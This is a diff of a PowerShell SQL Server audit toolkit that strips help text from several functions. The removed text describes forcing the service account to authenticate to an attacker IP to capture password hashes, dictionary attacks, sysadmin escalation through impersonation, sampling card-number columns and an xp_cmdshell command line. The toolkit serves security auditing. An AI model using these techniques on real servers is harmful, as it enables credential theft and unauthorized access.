-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivTrustworthy -Instance SQLServer1\STANDARDDEV2014
 
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : Excessive Privilege - Trustworthy Database
-            Description   : One or more database is configured as trustworthy.  The TRUSTWORTHY database property is used to indicate whether the instance of SQL Server trusts the database
-            and the contents within it.  Including potentially malicious assemblies with an EXTERNAL_ACCESS or UNSAFE permission setting. Also, potentially malicious modules
-            that are defined to execute as high privileged users. Combined with other weak configurations it can lead to user impersonation and arbitrary code exection on
-            the server.
-            Remediation   : Configured the affected database so the 'is_trustworthy_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE MyAppsDb SET TRUSTWORTHY ON' is used to
-            set a database as trustworthy.  A query similar to 'ALTER DATABASE MyAppDb SET TRUSTWORTHY OFF' can be use to unset it.
-            Severity      : Low
-            IsVulnerable  : Yes
-            IsExploitable : No
-            Exploited     : No
-            ExploitCmd    : There is not exploit available at this time.
-            Details       : The database testdb was found configured as trustworthy.
-            Reference     : https://msdn.microsoft.com/en-us/library/ms187861.aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivTrustworthy -Verbose
-    #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -15426,10 +12790,6 @@ Function Invoke-SQLAuditPrivTrustworthy
     }
 }
 
-
-# ---------------------------------------
-# Invoke-SQLAuditPrivAutoExecSp
-# ---------------------------------------
 
 Function  Invoke-SQLAuditPrivAutoExecSp
 {
@@ -15698,55 +13058,10 @@ Function  Invoke-SQLAuditPrivAutoExecSp
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditPrivXpDirtree
-# ---------------------------------------
 
 Function Invoke-SQLAuditPrivXpDirtree
 {
-    <#
-            .SYNOPSIS
-            Check if the current user has privileges to execute xp_dirtree extended stored procedure.
-            If exploit option is used, the script will inject a UNC path to the attacker's IP and capture
-            the SQL Server service account password hash using Inveigh.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .PARAMETER AttackerIp
-            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.
-            .PARAMETER TimeOut
-            Number of seconds to wait for authentication from target SQL Server.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivXpDirtree -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : Excessive Privilege - Execute xp_dirtree
-            Description   : xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force
-            the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized
-            access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats
-            because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.
-            Remediation   : Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public
-            Severity      : Medium
-            IsVulnerable  : Yes
-            IsExploitable : Yes
-            Exploited     : Yes
-            ExploitCmd    : Crack the password hash offline or relay it to another system.
-            Details       : The public principal has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type =
-            NetNTLMv1;Hash = SQLSvcAcnt::Domain:0000000000000000400000000000000000000000000000000:1CEC319E75261CEC319E759E7511E1CEC319E753AB7D:
-            Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpDirtree -Verbose
-    #>
+    
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -16058,38 +13373,9 @@ Function Invoke-SQLAuditPrivXpDirtree
     }
 }
 
-
-# ---------------------------------------
-# Invoke-SQLAuditPrivXpFileexist
-# ---------------------------------------
-
 Function Invoke-SQLAuditPrivXpFileexist
 {
-    <#
-            .SYNOPSIS
-            Check if the current user has privileges to execute xp_fileexist extended stored procedure.
-            If exploit option is used, the script will inject a UNC path to the attacker's IP and capture
-            the SQL Server service account password hash using Inveigh.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .PARAMETER AttackerIp
-            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.
-            .PARAMETER TimeOut
-            Number of seconds to wait for authentication from target SQL Server.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivXpFileexist -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2
-
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpFileexist -Verbose
-    #>
+    
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -16397,49 +13683,10 @@ Function Invoke-SQLAuditPrivXpFileexist
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditPrivDbChaining
-# ---------------------------------------
 
 Function Invoke-SQLAuditPrivDbChaining
 {
-    <#
-            .SYNOPSIS
-            Check if data ownership chaining is enabled at the server or databases levels.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER NoDefaults
-            Don't return information for default databases.
-            .PARAMETER NoOutput
-            Don't return output.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivDbChaining -Instance SQLServer1\STANDARDDEV2014
-
-            ComputerName  : NETSPI-283-SSU
-            Instance      : NETSPI-283-SSU\STANDARDDEV2014
-            Vulnerability : Excessive Privilege - Database Ownership Chaining
-            Description   : Ownership chaining was found enabled at the server or database level.  Enabling ownership chaining can lead to unauthorized access to database resources.
-            Remediation   : Configured the affected database so the 'is_db_chaining_on' flag is set to 'false'.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING ON' is used
-            enable chaining.  A query similar to 'ALTER DATABASE Database1 SET DB_CHAINING OFF;' can be used to disable chaining.
-            Severity      : Low
-            IsVulnerable  : Yes
-            IsExploitable : No
-            Exploited     : No
-            ExploitCmd    : There is not exploit available at this time.
-            Details       : The database testdb was found configured with ownership chaining enabled.
-            Reference     : https://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx,https://msdn.microsoft.com/en-us/library/bb669059(v=vs.110).aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditPrivDbChaining -Verbose
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -16596,24 +13843,7 @@ Function Invoke-SQLAuditPrivDbChaining
             $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
         }
 
-        # -----------------------------------------------------------------
-        # Check for exploit dependancies
-        # Note: Typically secondary configs required for dba/os execution
-        # -----------------------------------------------------------------
-        # $IsExploitable = "No" or $IsExploitable = "Yes"
-        # Check if the link is alive and verify connection + check if sysadmin
 
-
-        # -----------------------------------------------------------------
-        # Exploit Vulnerability
-        # Note: Add the current user to sysadmin fixed server role
-        # -----------------------------------------------------------------
-        # $Exploited = "No" or $Exploited     = "Yes"
-        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
-        # Also, recommend link crawler module
-
-
-        # Status User
         Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Database Ownership Chaining"
     }
 
@@ -16628,45 +13858,9 @@ Function Invoke-SQLAuditPrivDbChaining
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditPrivCreateProcedure
-# ---------------------------------------
-
 Function Invoke-SQLAuditPrivCreateProcedure
 {
-    <#
-            .SYNOPSIS
-            Check if the current login has the CREATE PROCEDURE permission.  Attempt to leverage to obtain sysadmin privileges.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER NoOutput
-            Don't output anything.
-            .PARAMETER Exploit
-            Exploit vulnerable issues
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Invoke-SQLAuditPrivCreateProcedure -Username evil -Password Password123!
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : PERMISSION - CREATE PROCEDURE
-            Description   : The login has privileges to create stored procedures in one or more databases.  This may allow the login to escalate privileges within the database.
-            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: GRANT CREATE PROCEDURE TO user, and can be removed with a
-            command like: REVOKE CREATE PROCEDURE TO user.
-            Severity      : Medium
-            IsVulnerable  : Yes
-            IsExploitable : No
-            Exploited     : No
-            ExploitCmd    : No exploit is currently available that will allow evil to become a sysadmin.
-            Details       : The evil principal has the CREATE PROCEDURE permission in the testdb database.
-            Reference     : https://msdn.microsoft.com/en-us/library/ms187926.aspx?f=255&MSPPError=-2147217396
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -16859,74 +14053,10 @@ Function Invoke-SQLAuditPrivCreateProcedure
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditWeakLoginPw
-# ---------------------------------------
 
 Function Invoke-SQLAuditWeakLoginPw
 {
-    <#
-            .SYNOPSIS
-            Perform dictionary attack for common passwords. By default, it will enumerate
-            SQL Server logins and the current login and test for "username" as password
-            for each enumerated login.
-            .PARAMETER Username
-            Known SQL Server login to obtain a list of logins with for testing.
-            .PARAMETER TestUsername
-            SQL Server or domain account to authenticate with.
-            .PARAMETER UserFile
-            Path to list of users to use.  One per line.
-            .PARAMETER Password
-            Known SQL Server login password to obtain a list of logins with for testing.
-            .PARAMETER TestPassword
-            Password to test provided or discovered logins with.
-            .PARAMETER PassFile
-            Path to list of password to use.  One per line.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER NoUserAsPass
-            Don't try to login using the login name as the password.
-            .PARAMETER NoUserEnum
-            Don't try to enumerate logins to test.
-            .PARAMETER FuzzNum
-            The number of Principal IDs to fuzz during blind SQL login enumeration as a least privilege login.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceLocal | Invoke-SQLAuditWeakLoginPw -Username myuser -Password mypassword
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : Weak Login Password
-            Description   : One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.
-            Remediation   : Ensure all SQL Server logins are required to use a strong password. Considered inheriting the OS password policy.
-            Severity      : High
-            IsVulnerable  : Yes
-            IsExploitable : Yes
-            Exploited     : No
-            ExploitCmd    : Use the affected credentials to log into the SQL Server, or rerun this command with -Exploit.
-            Details       : The testuser (Not Sysadmin) is configured with the password testuser.
-            Reference     : https://msdn.microsoft.com/en-us/library/ms161959.aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\Express
-            Vulnerability : Weak Login Password
-            Description   : One or more SQL Server logins is configured with a weak password.  This may provide unauthorized access to resources the affected logins have access to.
-            Remediation   : Ensure all SQL Server logins are required to use a strong password. Considered inheriting the OS password policy.
-            Severity      : High
-            IsVulnerable  : Yes
-            IsExploitable : Yes
-            Exploited     : No
-            ExploitCmd    : Use the affected credentials to log into the SQL Server, or rerun this command with -Exploit.
-            Details       : The testadmin (Sysadmin) is configured with the password testadmin.
-            Reference     : https://msdn.microsoft.com/en-us/library/ms161959.aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditWeakLoginPw -Verbose -Instance SQLServer1\STANDARDDEV2014
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -17343,46 +14473,9 @@ Function Invoke-SQLAuditWeakLoginPw
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditRoleDbOwner
-# ---------------------------------------
-
 Function Invoke-SQLAuditRoleDbOwner
 {
-    <#
-            .SYNOPSIS
-            Check if the current login has the db_owner role in any databases.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditRoleDbOwner -Instance SQLServer1\STANDARDDEV2014 -Username myuser -Password mypassword
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : DATABASE ROLE - DB_OWNER
-            Description   : The login has the DB_OWER role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted and
-            owned by a sysadmin.
-            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_OWNER', 'MyDbUser', and can be removed with
-            a command like:  EXEC sp_droprolemember 'DB_OWNER', 'MyDbUser'
-            Severity      : Medium
-            IsVulnerable  : Yes
-            IsExploitable : Yes
-            Exploited     : No
-            ExploitCmd    : Invoke-SQLAuditRoleDbOwner -Instance SQLServer1\STANDARDDEV2014 -Username myuser -Password mypassword -Exploit
-            Details       : myuser has the DB_OWNER role in the testdb database.
-            Reference     : https://msdn.microsoft.com/en-us/library/ms189121.aspx,https://msdn.microsoft.com/en-us/library/ms187861.aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditRoleDbOwner -Verbose
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -17620,46 +14713,9 @@ Function Invoke-SQLAuditRoleDbOwner
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditRoleDbDdlAdmin
-# ---------------------------------------
-
 Function Invoke-SQLAuditRoleDbDdlAdmin
 {
-    <#
-            .SYNOPSIS
-            Check if the current user has the db_ddladmin role in any databases.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditRoleDbDdlAdmin -Instance SQLServer1\STANDARDDEV2014 -username myuser -password mypassword
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : DATABASE ROLE - DB_DDLADMIN
-            Description   : The login has the DB_DDLADMIN role in one or more databases.  This may allow the login to escalate privileges to sysadmin if the affected databases are trusted
-            and owned by a sysadmin, or if a custom assembly can be loaded.
-            Remediation   : If the permission is not required remove it.  Permissions are granted with a command like: EXEC sp_addrolemember 'DB_DDLADMIN', 'MyDbUser', and can be removed
-            with a command like:  EXEC sp_droprolemember 'DB_DDLADMIN', 'MyDbUser'
-            Severity      : Medium
-            IsVulnerable  : Yes
-            IsExploitable : No
-            Exploited     : No
-            ExploitCmd    : No exploit command is available at this time, but a custom assesmbly could be used.
-            Details       : myuser has the DB_DDLADMIN role in the testdb database.
-            Reference     : https://technet.microsoft.com/en-us/library/ms189612(v=sql.105).aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain | Invoke-SQLAuditRoleDbDdlAdmin -Verbose
-    #>
+ 
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -17877,64 +14933,9 @@ Function Invoke-SQLAuditRoleDbDdlAdmin
 }
 
 
-# -----------------------------------
-# Invoke-SQLAuditPrivImpersonateLogin
-# -----------------------------------
-
 Function Invoke-SQLAuditPrivImpersonateLogin
 {
-    <#
-            .SYNOPSIS
-            Check if the current login has the IMPERSONATE permission on any sysadmin logins. Attempt to use permission to obtain sysadmin privileges.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER NoOutput
-            Don't output anything.
-            .PARAMETER Exploit
-            Exploit vulnerable issues
-			.PARAMETER Nested
-            Exploit Nested Impersonation Capabilites
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123!
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : PERMISSION - IMPERSONATE LOGIN
-            Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
-            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
-            Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
-            Severity      : High
-            IsVulnerable  : Yes
-            IsExploitable : Yes
-            Exploited     : No
-            ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
-            Details       : public can impersonate the sa SYSADMIN login. This test was ran with the evil login.
-            Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Username evil -Password Password123! -Exploit
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : PERMISSION - IMPERSONATE LOGIN
-            Description   : The current SQL Server login can impersonate other logins.  This may allow an authenticated login to gain additional privileges.
-            Remediation   : Consider using an alterative to impersonation such as signed stored procedures. Impersonation is enabled using a command like: GRANT IMPERSONATE ON
-            Login::sa to [user]. It can be removed using a command like: REVOKE IMPERSONATE ON Login::sa to [user]
-            Severity      : High
-            IsVulnerable  : Yes
-            IsExploitable : Yes
-            Exploited     : Yes
-            ExploitCmd    : Invoke-SQLAuditPrivImpersonateLogin -Instance SQLServer1\STANDARDDEV2014 -Exploit
-            Details       : public can impersonate the sa SYSADMIN login. This test was ran with the evil login.
-            Reference     : https://msdn.microsoft.com/en-us/library/ms181362.aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
@@ -18192,51 +15193,9 @@ Function Invoke-SQLAuditPrivImpersonateLogin
 }
 
 
-# ---------------------------------------
-# Invoke-SQLAuditSampleDataByColumn
-# ---------------------------------------
-
 Function Invoke-SQLAuditSampleDataByColumn
 {
-    <#
-            .SYNOPSIS
-            Check if the current login can access any database columns that contain the word password. Supports column name keyword search and custom data sample size.
-            Note: For cleaner data sample output use the Get-SQLColumnSampleData function.
-            .PARAMETER Username
-            SQL Server or domain account to authenticate with.
-            .PARAMETER Password
-            SQL Server or domain account password to authenticate with.
-            .PARAMETER Credential
-            SQL Server credential.
-            .PARAMETER Instance
-            SQL Server instance to connection to.
-            .PARAMETER NoOutput
-            Don't output anything.
-            .PARAMETER Exploit
-            Exploit vulnerable issues
-            .PARAMETER SampleSize
-            Number of records to sample.
-            .PARAMETER Keyword
-            Column name to search for.
-            .PARAMETER Exploit
-            Exploit vulnerable issues.
-            .EXAMPLE
-            PS C:\> Invoke-SQLAuditSampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Keyword card -SampleSize 2 -Exploit
-
-            ComputerName  : SQLServer1
-            Instance      : SQLServer1\STANDARDDEV2014
-            Vulnerability : Potentially Sensitive Columns Found
-            Description   : Columns were found in non default databases that may contain sensitive information.
-            Remediation   : Ensure that all passwords and senstive data are masked, hashed, or encrypted.
-            Severity      : Informational
-            IsVulnerable  : Yes
-            IsExploitable : Yes
-            Exploited     : Yes
-            ExploitCmd    : Invoke-SQLAuditSampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Exploit
-            Details       : Data sample from [testdb].[dbo].[tracking].[card] : "4111111111111111" "4111111111111112".
-            Reference     : https://msdn.microsoft.com/en-us/library/ms188348.aspx
-            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
-    #>
+   
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
